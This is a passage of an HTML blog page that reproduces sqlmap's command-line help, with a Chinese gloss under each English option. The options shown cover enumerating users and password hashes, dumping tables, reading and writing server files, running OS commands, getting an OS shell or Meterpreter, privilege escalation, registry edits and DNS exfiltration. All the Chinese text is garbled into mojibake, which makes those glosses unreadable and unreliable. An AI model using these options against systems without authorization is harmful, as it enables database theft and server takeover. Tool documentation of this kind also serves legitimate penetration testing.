è¦åœ¨UNIONæŸ¥è¯¢SQLæ³¨å…¥çš„FROMéƒ¨åˆ†ä½¿ç”¨çš„è¡¨</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--dns-domain</span>=DNS.. Domain name used <span class="keyword">for</span><span class="built_in"> DNS </span>exfiltration attack</span><br><span class="line"><span class="comment">##  åŸŸåç”¨äºDNSæ¼å‡ºæ”»å‡»</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--second-order</span>=S.. Resulting<span class="built_in"> page </span>URL searched <span class="keyword">for</span> second-order response</span><br><span class="line"><span class="comment">## ç”Ÿæˆé¡µé¢çš„URLæœç´¢ä¸ºsecond-orderå“åº”</span></span><br></pre></td></tr></table></figure><h3 id="Fingerprintï¼ˆæŒ‡çº¹ï¼‰"><a href="#Fingerprintï¼ˆæŒ‡çº¹ï¼‰" class="headerlink" title="Fingerprintï¼ˆæŒ‡çº¹ï¼‰"></a>Fingerprintï¼ˆæŒ‡çº¹ï¼‰</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Fingerprintï¼ˆæŒ‡çº¹ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">-f, <span class="comment">--fingerprint Perform an extensive DBMS version fingerprint</span></span><br><span class="line"><span class="comment">## æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹</span></span><br></pre></td></tr></table></figure><h3 id="Enumerationï¼ˆæšä¸¾ï¼‰"><a href="#Enumerationï¼ˆæšä¸¾ï¼‰" class="headerlink" title="Enumerationï¼ˆæšä¸¾ï¼‰"></a>Enumerationï¼ˆæšä¸¾ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">Enumerationï¼ˆæšä¸¾ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="keyword">to</span> enumerate the back-end database management<span class="built_in"> system </span>information, structure <span class="keyword">and</span> data contained <span class="keyword">in</span> the tables. Moreover you can <span class="builtin-name">run</span> your own SQL statements</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„SQLè¯­å¥ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line">-a, --all Retrieve everything</span><br><span class="line"><span class="comment">## æ£€ç´¢ä¸€åˆ‡</span></span><br><span class="line">â€‹</span><br><span class="line">-b, --banner Retrieve DBMS banner</span><br><span class="line"><span class="comment">## æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†</span></span><br><span class="line">â€‹</span><br><span class="line">--current-user Retrieve DBMS current<span class="built_in"> user</span></span><br><span class="line"><span class="built_in"></span><span class="comment">##  æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ æ ‡è¯†</span></span><br><span class="line">â€‹</span><br><span class="line">--current-db Retrieve DBMS current database</span><br><span class="line"><span class="comment">## æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“</span></span><br><span class="line">â€‹</span><br><span class="line">-hostname Retrieve DBMS<span class="built_in"> server </span>hostname</span><br><span class="line"><span class="comment">## æ£€ç´¢æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºå</span></span><br><span class="line">â€‹</span><br><span class="line">--is-dba Detect <span class="keyword">if</span> the DBMS current<span class="built_in"> user </span>is DBA</span><br><span class="line"><span class="comment">## æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA</span></span><br><span class="line">â€‹</span><br><span class="line">--users Enumerate DBMS<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·</span></span><br><span class="line">â€‹</span><br><span class="line">--passwords Enumerate DBMS<span class="built_in"> users </span>password hashes</span><br><span class="line"><span class="comment">## æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ</span></span><br><span class="line">â€‹</span><br><span class="line">--privileges Enumerate DBMS<span class="built_in"> users </span>privileges</span><br><span class="line"><span class="comment">## æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™</span></span><br><span class="line">â€‹</span><br><span class="line">--roles Enumerate DBMS<span class="built_in"> users </span>roles</span><br><span class="line"><span class="comment">## æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²</span></span><br><span class="line">â€‹</span><br><span class="line">--dbs Enumerate DBMS databases</span><br><span class="line"><span class="comment">## æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“</span></span><br><span class="line">â€‹</span><br><span class="line">--tables Enumerate DBMS database tables</span><br><span class="line"><span class="comment">##  æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨</span></span><br><span class="line">â€‹</span><br><span class="line">--columns Enumerate DBMS database table columns</span><br><span class="line"><span class="comment">## æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—</span></span><br><span class="line">â€‹</span><br><span class="line">--schema Enumerate DBMS schema</span><br><span class="line"><span class="comment">## æšä¸¾æ•°æ®åº“æ¶æ„</span></span><br><span class="line">â€‹</span><br><span class="line">--count Retrieve number of entries <span class="keyword">for</span> table(s)</span><br><span class="line"><span class="comment">## æ£€ç´¢è¡¨çš„æ¡ç›®æ•°</span></span><br><span class="line">â€‹</span><br><span class="line">--dump Dump DBMS database table entries</span><br><span class="line"><span class="comment">##  è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹</span></span><br><span class="line">â€‹</span><br><span class="line">--dump-all Dump all DBMS databases tables entries</span><br><span class="line"><span class="comment">## è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹</span></span><br><span class="line">â€‹</span><br><span class="line">--search Search column(s), table(s) <span class="keyword">and</span>/<span class="keyword">or</span> database name(s)</span><br><span class="line"><span class="comment">##  æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line">--comments Retrieve DBMS comments</span><br><span class="line"><span class="comment">##  æ£€ç´¢æ•°æ®åº“çš„comments(æ³¨é‡Šã€è¯„è®º)</span></span><br><span class="line">â€‹</span><br><span class="line">-D DB DBMS database <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“å</span></span><br><span class="line">â€‹</span><br><span class="line">-T TBL DBMS database table(s) <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">##  è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“è¡¨</span></span><br><span class="line">â€‹</span><br><span class="line">-C COL DBMS database table column(s) <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—</span></span><br><span class="line">â€‹</span><br><span class="line">-X EXCLUDECOL DBMS database table column(s) <span class="keyword">to</span> <span class="keyword">not</span> enumerate</span><br><span class="line"><span class="comment">## è¦ä¸è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—</span></span><br><span class="line">â€‹</span><br><span class="line">-U<span class="built_in"> USER </span>DBMS<span class="built_in"> user </span><span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·</span></span><br><span class="line">â€‹</span><br><span class="line">--exclude-sysdbs Exclude DBMS<span class="built_in"> system </span>databases when enumerating tables</span><br><span class="line"><span class="comment">##  æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--pivot-column</span>=P.. Pivot column name</span><br><span class="line"><span class="comment">## ä¸»åˆ—åç§°</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--where</span>=DUMPWHERE Use WHERE condition <span class="keyword">while</span> table dumping</span><br><span class="line"><span class="comment">## ä½¿ç”¨WHEREæ¡ä»¶è¿›è¡Œè¡¨è½¬å‚¨</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--start</span>=LIMITSTART First query output entry <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">##  ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--stop</span>=LIMITSTOP Last query output entry <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">## æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--first</span>=FIRSTCHAR First query output word character <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">## ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--last</span>=LASTCHAR Last query output word character <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">## æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--sql-query</span>=QUERY SQL statement <span class="keyword">to</span> be executed</span><br><span class="line"><span class="comment">## è¦æ‰§è¡Œçš„SQLè¯­å¥</span></span><br><span class="line">â€‹</span><br><span class="line">--sql-shell Prompt <span class="keyword">for</span> an interactive SQL shell</span><br><span class="line"><span class="comment">## æç¤ºäº¤äº’å¼SQLçš„shell</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--sql-file</span>=SQLFILE Execute SQL statements <span class="keyword">from</span> given file(s)</span><br><span class="line"><span class="comment">## ä»ç»™å®šæ–‡ä»¶æ‰§è¡ŒSQLè¯­å¥</span></span><br></pre></td></tr></table></figure><h3 id="Brute-Forceï¼ˆè›®åŠ›ï¼‰"><a href="#Brute-Forceï¼ˆè›®åŠ›ï¼‰" class="headerlink" title="Brute Forceï¼ˆè›®åŠ›ï¼‰"></a>Brute Forceï¼ˆè›®åŠ›ï¼‰</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Brute forceï¼ˆè›®åŠ›ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="keyword">to</span> <span class="built_in">run</span> brute force checks</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--common-tables Check existence of common tables</span></span><br><span class="line"><span class="comment">## æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--common-columns Check existence of common columns</span></span><br><span class="line"><span class="comment">## æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—</span></span><br></pre></td></tr></table></figure><h3 id="User-defined-function-injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"><a href="#User-defined-function-injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰" class="headerlink" title="User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"></a>User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span>-defined <span class="keyword">function</span> injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These <span class="keyword">options</span> can be used <span class="keyword">to</span> <span class="keyword">create</span> custom <span class="keyword">user</span>-defined <span class="keyword">functions</span></span><br><span class="line">## è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚</span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--udf-inject Inject custom user-defined functions</span></span><br><span class="line">## æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--shared-lib=SHLIB Local path of the shared library</span></span><br><span class="line">## å…±äº«åº“çš„æœ¬åœ°è·¯å¾„</span><br></pre></td></tr></table></figure><h3 id="File-system-accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰"><a href="#File-system-accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰" class="headerlink" title="File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰"></a>File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰</h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰:</span><br><span class="line">These options can be used <span class="keyword">to</span> access the back-<span class="keyword">end</span> database management system underlying <span class="keyword">file</span> system</span><br><span class="line">## è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚</span><br><span class="line">â€‹</span><br><span class="line">--<span class="keyword">file</span>-<span class="keyword">read</span>=RFILE <span class="keyword">Read</span> a <span class="keyword">file</span> from the back-<span class="keyword">end</span> DBMS <span class="keyword">file</span> system</span><br><span class="line">## ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶</span><br><span class="line">â€‹</span><br><span class="line">--<span class="keyword">file</span>-<span class="keyword">write</span>=WFILE <span class="keyword">Write</span> a <span class="keyword">local</span> <span class="keyword">file</span> <span class="keyword">on</span> the back-<span class="keyword">end</span> DBMS <span class="keyword">file</span> system</span><br><span class="line">## ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶</span><br><span class="line">â€‹</span><br><span class="line">--<span class="keyword">file</span>-dest=DFILE Back-<span class="keyword">end</span> DBMS <span class="keyword">absolute</span> filepath <span class="keyword">to</span> <span class="keyword">write</span> <span class="keyword">to</span></span><br><span class="line">## åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><h3 id="Operating-system-accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰"><a href="#Operating-system-accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰" class="headerlink" title="Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰"></a>Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Operating <span class="keyword">system</span> accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="built_in">to</span> access <span class="keyword">the</span> back-<span class="function"><span class="keyword">end</span> <span class="title">database</span> <span class="title">management</span> <span class="title">system</span> <span class="title">underlying</span> <span class="title">operating</span> <span class="title">system</span></span></span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--os-cmd=OSCMD Execute an operating system command</span></span><br><span class="line"><span class="comment">## æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--os-shell Prompt for an interactive operating system shell</span></span><br><span class="line"><span class="comment">##  äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„shell</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--os-pwn Prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"><span class="comment">## è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"><span class="comment">## ä¸€é”®è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--os-bof Stored procedure buffer overflow exploitation</span></span><br><span class="line"><span class="comment">## å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--priv-esc Database process user privilege escalation</span></span><br><span class="line"><span class="comment">## æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span></span><br><span class="line"><span class="comment">## æœ¬åœ°çš„å®‰è£…è·¯å¾„</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--tmp-path=TMPPATH Remote absolute path of temporary files directory</span></span><br><span class="line"><span class="comment">## è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br></pre></td></tr></table></figure><h3 id="Windows-registry-accessï¼ˆWindowsæ³¨å†Œè¡¨è®¿é—®ï¼‰"><a href="#Windows-registry-accessï¼ˆWindowsæ³¨å†Œè¡¨è®¿é—®ï¼‰" class="headerlink" title="Windows registry accessï¼ˆWindowsæ³¨å†Œè¡¨è®¿é—®ï¼‰"></a>Windows registry accessï¼ˆWindowsæ³¨å†Œè¡¨è®¿é—®ï¼‰</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows registry accessï¼ˆWindowsæ³¨å†Œè¡¨è®¿é—®ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="keyword">to</span> access <span class="keyword">the</span> <span class="keyword">back</span>-<span class="keyword">end</span> database management system Windows registry</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindowsæ³¨å†Œè¡¨ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-read Read a Windows registry key value</span></span><br><span class="line"><span class="comment">## è¯»ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-add Write a Windows registry key value data</span></span><br><span class="line"><span class="comment">## å†™ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼æ•°æ®</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-del Delete a Windows registry key value</span></span><br><span class="line"><span class="comment">## åˆ é™¤Windowsæ³¨å†Œè¡¨é”®å€¼</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-key=REGKEY Windows registry key</span></span><br><span class="line"><span class="comment">## Windowsæ³¨å†Œè¡¨é”®</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-value=REGVAL Windows registry key value</span></span><br><span class="line"><span class="comment">##  Windowsæ³¨å†Œè¡¨é¡¹å€¼</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-data=REGDATA Windows registry key value data</span></span><br><span class="line"><span class="comment">## Windowsæ³¨å†Œè¡¨é”®å€¼æ•°æ®</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="comment">--reg-type=REGTYPE Windows registry key value type</span></span><br><span class="line"><span class="comment">## Windowsæ³¨å†Œè¡¨é¡¹å€¼ç±»å‹</span></span><br></pre></td></tr></table></figure><h3 id="Generalï¼ˆä¸€èˆ¬ï¼‰"><a href="#Generalï¼ˆä¸€èˆ¬ï¼‰" class="headerlink" title="Generalï¼ˆä¸€èˆ¬ï¼‰"></a>Generalï¼ˆä¸€èˆ¬ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Generalï¼ˆä¸€èˆ¬ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">These options can be used <span class="keyword">to</span> <span class="builtin-name">set</span> some general working parameters</span><br><span class="line"><span class="comment">## è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line">-s SESSIONFILE Load session <span class="keyword">from</span> a stored (.sqlite) file</span><br><span class="line"><span class="comment">## ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®</span></span><br><span class="line">â€‹</span><br><span class="line">-t TRAFFICFILE Log all HTTP traffic into a textual file</span><br><span class="line"><span class="comment">## è®°å½•æ‰€æœ‰HTTPæµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­</span></span><br><span class="line">â€‹</span><br><span class="line">--batch Never ask <span class="keyword">for</span><span class="built_in"> user </span>input, use the<span class="built_in"> default </span>behaviour</span><br><span class="line"><span class="comment">## ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--binary-fields</span>=.. Result fields having binary values (e.g. <span class="string">&quot;digest&quot;</span>)</span><br><span class="line"><span class="comment">## å…·æœ‰äºŒè¿›åˆ¶å€¼çš„ç»“æœå­—æ®µ</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--charset</span>=CHARSET Force character encoding used <span class="keyword">for</span> data retrieval</span><br><span class="line"><span class="comment">## å¼ºåˆ¶ç”¨äºæ•°æ®æ£€ç´¢çš„å­—ç¬¦ç¼–ç </span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--crawl</span>=CRAWLDEPTH Crawl the website starting <span class="keyword">from</span> the target URL</span><br><span class="line"><span class="comment">## ä»ç›®æ ‡ç½‘å€å¼€å§‹æŠ“å–ç½‘ç«™</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--crawl-exclude</span>=.. Regexp <span class="keyword">to</span> exclude pages <span class="keyword">from</span> crawling (e.g. <span class="string">&quot;logout&quot;</span>)</span><br><span class="line"><span class="comment">## æ­£åˆ™è¡¨è¾¾å¼æ’é™¤ç½‘é¡µæŠ“å–</span></span><br><span class="line">â€‹</span><br><span class="line"><span 